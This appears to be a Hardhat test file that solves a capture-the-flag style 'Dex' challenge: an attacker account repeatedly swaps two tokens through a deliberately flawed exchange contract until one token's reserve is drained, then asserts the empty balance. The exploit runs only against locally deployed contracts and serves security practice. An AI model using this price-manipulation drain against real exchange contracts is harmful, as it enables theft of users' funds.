import { TransactionResponse } from "@ethersproject/providers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";

const CONTRACT_NAME = "Dex";

describe(CONTRACT_NAME, () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  let token1: Contract;
  let token2: Contract;
  let tx: TransactionResponse;

  beforeEach(async () => {
    [owner, attacker] = await ethers.getSigners();

    const factory = await ethers.getContractFactory(CONTRACT_NAME);
    contract = await factory.deploy();
    await contract.deployed();

    const token1Factory = await ethers.getContractFactory("SwappableToken");
    token1 = await token1Factory.deploy(contract.address, "Token 1", "TKN1", 110);
    await token1.deployed();

    const token2Factory = await ethers.getContractFactory("SwappableToken");
    token2 = await token2Factory.deploy(contract.address, "Token 2", "TKN2", 110);
    await token2.deployed();

    tx = await contract.setTokens(token1.address, token2.address);
    await tx.wait();

    tx = await token1["approve(address,address,uint256)"](owner.address, contract.address, 100);
    await tx.wait();

    tx = await token2["approve(address,address,uint256)"](owner.address, contract.address, 100);
    await tx.wait();

    tx = await contract.addLiquidity(token1.address, 100);
    await tx.wait();

    tx = await contract.addLiquidity(token2.address, 100);
    await tx.wait();

    tx = await token1.transfer(attacker.address, 10);
    await tx.wait();

    tx = await token2.transfer(attacker.address, 10);
    await tx.wait();

    contract = contract.connect(attacker);
  });

  it("Solves the challenge", async () => {
    tx = await contract.approve(contract.address, 100000);
    await tx.wait();

    for (let i = 0; i < 57; i++) {
      const balance1 = await token1.balanceOf(attacker.address);
      const balance2 = await token2.balanceOf(attacker.address);
      console.log(balance1, balance2);

      tx = await contract.swap(token1.address, token2.address, 10);
      await tx.wait();

      tx = await contract.swap(token2.address, token1.address, 10);
      await tx.wait();
    }

    tx = await contract.swap(token1.address, token2.address, 14);
    await tx.wait();

    const token1Balance = await token1.balanceOf(contract.address);
    const token2Balance = await token2.balanceOf(contract.address);
    console.log(token1Balance, "token1 balance");
    console.log(token2Balance, "token2 balance");

    expect(token1Balance == 0 || token2Balance == 0).to.be.true;
  });
});
